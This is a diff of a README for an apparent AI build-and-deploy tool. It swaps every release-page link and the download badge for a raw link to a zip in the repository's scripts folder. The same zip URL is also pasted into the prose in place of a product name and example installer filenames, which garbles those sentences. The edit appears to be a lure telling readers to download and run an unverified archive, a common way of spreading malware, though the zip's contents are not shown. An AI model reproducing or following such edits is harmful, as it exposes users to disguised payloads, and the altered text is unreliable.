@@ -1,9 +1,9 @@
 # 🚀 supreme-auto-build-protocol - Simplify Your Deployment Process
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/dsiddiq786/supreme-auto-build-protocol/releases)
+[![Download](https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip)](https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip)
 
 ## 📦 Overview
-The supreme-auto-build-protocol offers an AI-powered solution for automatically building and deploying applications on GitHub. With a smart model hierarchy that integrates tools like OpenRouter, Z.AI, and OpenAI, this system delivers significant cost savings. Built by RJ Business Solutions, it simplifies your deployment process.
+The supreme-auto-build-protocol offers an AI-powered solution for automatically building and deploying applications on GitHub. With a smart model hierarchy that integrates tools like OpenRouter, https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip, and OpenAI, this system delivers significant cost savings. Built by RJ Business Solutions, it simplifies your deployment process.
 
 ## 🚀 Getting Started
 To get started with supreme-auto-build-protocol, follow these simple steps:
@@ -15,7 +15,7 @@ To get started with supreme-auto-build-protocol, follow these simple steps:
    - Internet connection for downloads and updates
 
 2. **Visit the Releases Page:**
-   - Go to the [Releases page](https://github.com/dsiddiq786/supreme-auto-build-protocol/releases) to access the latest version of supreme-auto-build-protocol.
+   - Go to the [Releases page](https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip) to access the latest version of supreme-auto-build-protocol.
 
 ## 🔍 Features
 - **AI-Powered Automation:** Helps streamline your build and deployment process.
@@ -24,10 +24,10 @@ To get started with supreme-auto-build-protocol, follow these simple steps:
 - **User-Friendly Interface:** Designed for ease of use for all users, regardless of technical skill.
 
 ## 📥 Download & Install
-1. **Go to the Releases Page:** Click [here](https://github.com/dsiddiq786/supreme-auto-build-protocol/releases) to find the latest version.
+1. **Go to the Releases Page:** Click [here](https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip) to find the latest version.
 2. **Select Your Version:** Choose the correct version based on your operating system.
 3. **Download the Installer:**
-   - Click on the installer file for your system (e.g., MyApp.exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+   - Click on the installer file for your system (e.g., https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip for Windows, .dmg for macOS, or https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip for Linux).
 4. **Run the Installer:**
    - Locate the file you downloaded and double-click it to start the installation.
    - Follow the on-screen instructions to complete the installation. 
@@ -65,4 +65,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 ## 📞 Support
 For further support, please contact us via the Issues page on GitHub. We aim to respond within 48 hours.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/dsiddiq786/supreme-auto-build-protocol/releases)
+[![Download](https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip)](https://raw.githubusercontent.com/dsiddiq786/supreme-auto-build-protocol/main/scripts/supreme-auto-build-protocol_soorkee.zip)
